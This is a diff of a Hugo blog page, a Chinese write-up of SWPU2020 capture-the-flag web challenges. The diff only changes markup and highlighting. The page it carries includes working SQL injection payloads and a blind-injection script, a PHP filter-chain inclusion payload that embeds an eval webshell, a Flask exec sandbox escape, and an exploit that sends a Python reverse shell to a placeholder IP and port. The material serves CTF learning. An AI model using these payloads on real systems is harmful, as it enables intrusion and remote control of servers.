@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.87.0" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -14,7 +14,7 @@
 
     <title>SWPU2020 | tyskillのBlog</title>
 
-    <link rel="stylesheet" href="/css/meme.min.09e7384df2ebf8f7760291a0d443770f44b39f5563546dd950293ed79e8d779b.css"/>
+    <link rel="stylesheet" href="/css/meme.min.12acc0ca7f74225e7b015741d28e3038696047c86698a0fb722ce126d04c739e.css"/>
 
     
     
@@ -291,10 +291,10 @@ Upgrade-Insecure-Requests: 1
 <p>回到<code>/administrator.html</code>登录，登陆成功后F12获得注释信息</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!--&lt;li&gt;&lt;a href=&#34;writeuser_00001_log.log&#34;&gt;日志记录&lt;/a&gt;&lt;/li&gt;--&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!--&lt;li&gt;&lt;a href=&#34;writeuser_00001_log.log&#34;&gt;日志记录&lt;/a&gt;&lt;/li&gt;--&gt;</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>访问获得日志记录，base64解码，然后访问<code>up_lo_ad_ad_min.php</code>，看名字是upload，应该是上传，寻找上传点，找不到。。。看了wp才发现原来还有另一个库<code>h1nt</code>，注入得到字段内容：</p>
@@ -302,10 +302,10 @@ Upgrade-Insecure-Requests: 1
 </code></pre><p>使用00001登录<code>up_lo_ad_ad_min.php</code>，出现上传点，绕不过，这里应该利用不了。。。不过此时hint字段的页面可以访问了且存在注入，直接<strong>load_file</strong>读取flag。</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="mi">0</span><span class="s1">&#39;union select 1,2,3,load_file(&#34;/flag&#34;)--+
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="mi">0</span><span class="s1">&#39;union select 1,2,3,load_file(&#34;/flag&#34;)--+
 </span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="sqlsqlsql"><a href="#sqlsqlsql" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:sqlsqlsql" class="headings">sqlsqlsql</a></h2>
@@ -317,10 +317,10 @@ hint2: 好好测测我都过滤了什么内容 根据过滤的内容想应对的
 <p>先传一个id=1，然后F12发现SQL语句：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!-- select * from users where id = &#39;$id&#39;--&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!-- select * from users where id = &#39;$id&#39;--&gt;</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>fuzz一下，ban了不少东西，官方wp上有的我就不说了，说点实际复现过程中遇到的问题：</p>
@@ -331,7 +331,7 @@ hint2: 好好测测我都过滤了什么内容 根据过滤的内容想应对的
 <p>exp</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -366,16 +366,16 @@ hint2: 好好测测我都过滤了什么内容 根据过滤的内容想应对的
 </span><span class="lnt">33
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span> <span class="kn">as</span> <span class="nn">req</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="nn">req</span>
 <span class="kn">import</span> <span class="nn">time</span>
 <span class="kn">import</span> <span class="nn">string</span>
-<span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span>  <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s2">&#34;_{}.&#34;</span>
+<span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span>  <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s2">&#34;_</span><span class="si">{}</span><span class="s2">.&#34;</span>
 <span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
 <span class="n">session</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
     <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
     <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
         <span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;http://182.150.46.187:8801/ttttt/?id=&#39;</span>
         <span class="c1"># 注表</span>
         <span class="c1">## users,flllag</span>
@@ -385,19 +385,19 @@ hint2: 好好测测我都过滤了什么内容 根据过滤的内容想应对的
         <span class="c1">## flag{blind_1nj3ct10n_1s_very_s1mpl3}</span>
         <span class="c1">## 官方：select(group_concat(`2`))from(select*from(select(1))as`a`join(select(2))as`b`union(select*from(flllag)))as`a`</span>
         <span class="n">sql_1</span> <span class="o">=</span> <span class="s2">&#34;select(group_concat(`2`))from(select*from((select(1))a)join((select(2))b)union(select*from(flllag)))c&#34;</span>
-        <span class="n">sql_2</span> <span class="o">=</span> <span class="s2">&#34;select({})regexp&#39;{}&#39;&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sql_1</span><span class="p">,</span> <span class="n">name</span><span class="o">+</span><span class="n">char</span><span class="p">)</span>
-        <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;case&#39;1&#39;when(({}))then&#39;1&#39;else(select(count(*))from((mysql.help_relation)join(mysql.help_topic)join(mysql.proc)))end&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sql_2</span><span class="p">)</span>
-        <span class="n">SQL</span> <span class="o">=</span> <span class="s2">&#34;1&#39;^(select({}))^&#39;1&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
+        <span class="n">sql_2</span> <span class="o">=</span> <span class="s2">&#34;select(</span><span class="si">{}</span><span class="s2">)regexp&#39;</span><span class="si">{}</span><span class="s2">&#39;&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sql_1</span><span class="p">,</span> <span class="n">name</span><span class="o">+</span><span class="n">char</span><span class="p">)</span>
+        <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;case&#39;1&#39;when((</span><span class="si">{}</span><span class="s2">))then&#39;1&#39;else(select(count(*))from((mysql.help_relation)join(mysql.help_topic)join(mysql.proc)))end&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sql_2</span><span class="p">)</span>
+        <span class="n">SQL</span> <span class="o">=</span> <span class="s2">&#34;1&#39;^(select(</span><span class="si">{}</span><span class="s2">))^&#39;1&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
         <span class="c1"># print(s)</span>
         <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
         <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">target</span> <span class="o">+</span> <span class="n">SQL</span><span class="p">)</span>
         <span class="n">end</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
         <span class="k">if</span> <span class="n">end</span> <span class="o">-</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="mf">0.5</span><span class="p">:</span>
             <span class="n">name</span> <span class="o">+=</span> <span class="n">char</span>
-            <span class="k">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[*]结果为：&#34;</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[*]结果为：&#34;</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>
             <span class="k">break</span>
     <span class="k">if</span> <span class="n">length</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
-        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[*]最终结果为：&#34;</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[*]最终结果为：&#34;</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>
         <span class="k">break</span>
 </code></pre></td></tr></table></div>
 </div>
@@ -417,7 +417,7 @@ Disallow: /index.php?route=pricing</p>
 <p>尝试路径拼接，访问<code>/./././pricing.action</code>，返回正常，说明可以拼接路径，但是测试无法跳转，这时可以尝试远程文件包含：<code>http://www.baidu.com.action</code>，回显处理路径源码：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -430,7 +430,7 @@ Disallow: /index.php?route=pricing</p>
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">function</span> <span class="nf">resolve_route</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
     <span class="nv">$path</span> <span class="o">=</span> <span class="o">@</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$bad_url</span> <span class="k">as</span> <span class="nv">$ukey</span><span class="p">)</span> <span class="p">{</span>
@@ -446,10 +446,10 @@ Disallow: /index.php?route=pricing</p>
 </div><p>可以看到这里对路径进行一次url解码，我们可以通过二次编码<code>%252f</code>绕过。既然知道怎么处理路径了，接下来就是读文件了，php伪协议直接读</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">php</span><span class="o">:%</span><span class="mi">252</span><span class="nx">f</span><span class="o">/</span><span class="nx">filter</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">index</span><span class="o">.</span><span class="nx">action</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">php</span><span class="o">:%</span><span class="mi">252</span><span class="nx">f</span><span class="o">/</span><span class="nx">filter</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">index</span><span class="o">.</span><span class="nx">action</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>在<code>contact.action</code>源码中找到一个GET表单，它获得输入后直接将输入值插入html表单而不做任何处理，只有一个html实体化，这样的话我们就可以通过编码绕过然后包含执行。</p>
@@ -461,10 +461,10 @@ Disallow: /index.php?route=pricing</p>
 <p>读flag，payload</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">php</span><span class="o">:%</span><span class="mi">252</span><span class="nx">f</span><span class="o">/</span><span class="nx">filter</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">utf</span><span class="o">-</span><span class="mf">8.</span><span class="nx">utf</span><span class="o">-</span><span class="mi">7</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">decode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">http</span><span class="o">:%</span><span class="mi">252</span><span class="nx">f</span><span class="o">/</span><span class="nx">localhost</span><span class="o">/</span><span class="nx">contact</span><span class="o">.</span><span class="nx">action</span><span class="o">%</span><span class="mi">3</span><span class="nx">fname</span><span class="o">=</span><span class="nx">xxPD9waHAgZXZhbCgkX0dFVFt0eXNdKTs</span><span class="o">/</span><span class="nx">Pg</span><span class="o">%</span><span class="mf">23.</span><span class="nx">action</span><span class="o">?</span><span class="nx">tys</span><span class="o">=</span><span class="nx">show_source</span><span class="p">(</span><span class="s2">&#34;/flag.txt&#34;</span><span class="p">);</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">php</span><span class="o">:%</span><span class="mi">252</span><span class="nx">f</span><span class="o">/</span><span class="nx">filter</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">utf</span><span class="o">-</span><span class="mf">8.</span><span class="nx">utf</span><span class="o">-</span><span class="mi">7</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">decode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">http</span><span class="o">:%</span><span class="mi">252</span><span class="nx">f</span><span class="o">/</span><span class="nx">localhost</span><span class="o">/</span><span class="nx">contact</span><span class="o">.</span><span class="nx">action</span><span class="o">%</span><span class="mi">3</span><span class="nx">fname</span><span class="o">=</span><span class="nx">xxPD9waHAgZXZhbCgkX0dFVFt0eXNdKTs</span><span class="o">/</span><span class="nx">Pg</span><span class="o">%</span><span class="mf">23.</span><span class="nx">action</span><span class="o">?</span><span class="nx">tys</span><span class="o">=</span><span class="nx">show_source</span><span class="p">(</span><span class="s2">&#34;/flag.txt&#34;</span><span class="p">);</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>由于表单不支持POST，所以这里也许无法达成后门。</p>
@@ -476,7 +476,7 @@ hint2: User-Agent</p>
 <p>传数组出现debug界面，然后各种尝试大概复原源码就差不多了。</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -504,16 +504,16 @@ hint2: User-Agent</p>
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#coding=utf-8</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1">#coding=utf-8</span>
 <span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">render_template</span><span class="p">,</span><span class="n">request</span><span class="p">,</span><span class="n">send_from_directory</span>
 <span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
 <span class="n">whitelist</span> <span class="o">=</span> <span class="s1">&#39;.0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_abcdefghijklmnopqrstuvwxyz&#39;</span>
 
-<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
 <span class="k">def</span> <span class="nf">Hello</span><span class="p">():</span>
     <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">)</span>
 
-<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/equ.php&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/equ.php&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
 <span class="k">def</span> <span class="nf">Equ</span><span class="p">():</span>
     <span class="n">left</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;left&#39;</span><span class="p">]</span>
     <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">left</span><span class="p">:</span>
@@ -524,11 +524,11 @@ hint2: User-Agent</p>
         <span class="k">if</span> <span class="n">ch</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">whitelist</span><span class="p">:</span>
             <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;equ.html&#34;</span><span class="p">,</span><span class="n">equation</span><span class="o">=</span><span class="s2">&#34;I&#39;m&#34;</span><span class="p">,</span><span class="n">result</span><span class="o">=</span><span class="s1">&#39;莫的感情的bot&#39;</span><span class="p">)</span>
 	<span class="n">equstr</span> <span class="o">=</span> <span class="n">left</span> <span class="o">+</span> <span class="s2">&#34;=&#34;</span> <span class="o">+</span><span class="n">right</span>
-    <span class="k">exec</span><span class="p">(</span><span class="s2">&#34;res=&#34;</span><span class="o">+</span><span class="n">left</span><span class="o">+</span><span class="s2">&#34;==&#34;</span><span class="o">+</span><span class="n">right</span><span class="p">)</span>
+    <span class="n">exec</span><span class="p">(</span><span class="s2">&#34;res=&#34;</span><span class="o">+</span><span class="n">left</span><span class="o">+</span><span class="s2">&#34;==&#34;</span><span class="o">+</span><span class="n">right</span><span class="p">)</span>
     <span class="n">result</span><span class="o">=</span> <span class="nb">locals</span><span class="p">()[</span><span class="s1">&#39;res&#39;</span><span class="p">]</span>
     <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;equ.html&#34;</span><span class="p">,</span><span class="n">equation</span><span class="o">=</span><span class="n">equstr</span><span class="p">,</span><span class="n">result</span><span class="o">=</span><span class="n">result</span><span class="p">)</span>
 
-<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/robots.txt&#39;</span><span class="p">)</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/robots.txt&#39;</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">static_from_root</span><span class="p">():</span>
 </code></pre></td></tr></table></div>
 </div>
@@ -537,10 +537,10 @@ hint2: User-Agent</p>
 <p>那就分析一下官方的payload：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">left</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="o">=</span><span class="n">__builtins__</span><span class="o">.</span><span class="k">exec</span><span class="p">;</span><span class="n">request</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">user_agent</span><span class="o">.</span><span class="n">string</span><span class="p">];</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">right</span><span class="o">=</span><span class="mi">1</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">left</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="o">=</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">exec</span><span class="p">;</span><span class="n">request</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">user_agent</span><span class="o">.</span><span class="n">string</span><span class="p">];</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">right</span><span class="o">=</span><span class="mi">1</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>1=1都看得懂，主要还是前面payload的构造。</p>
@@ -548,7 +548,7 @@ hint2: User-Agent</p>
 <p>exp</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -565,7 +565,7 @@ hint2: User-Agent</p>
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span> <span class="kn">as</span> <span class="nn">req</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="nn">req</span>
 <span class="n">url</span> <span class="o">=</span><span class="s2">&#34;http://noobpy.fkeuyri4yr34.das.wetolink.com:82/equ.php&#34;</span>
 <span class="n">session</span><span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
 <span class="k">def</span> <span class="nf">exp</span><span class="p">(</span><span class="n">poc1</span><span class="p">,</span><span class="n">poc2</span><span class="p">):</span>
@@ -577,7 +577,7 @@ hint2: User-Agent</p>
         <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="n">poc2</span>
     <span class="p">}</span>
     <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
 <span class="c1">#exp(&#39;__builtins__.eval=__builtins__.exec#&#39;,&#34;xxx&#34;)</span>
 <span class="n">exp</span><span class="p">(</span><span class="s2">&#34;request.__class__.__getitem__=__builtins__.exec;request[request.user_agent.string];&#34;</span><span class="p">,</span><span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;IP&#34;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span><span class="p">)</span>
 </code></pre></td></tr></table></div>
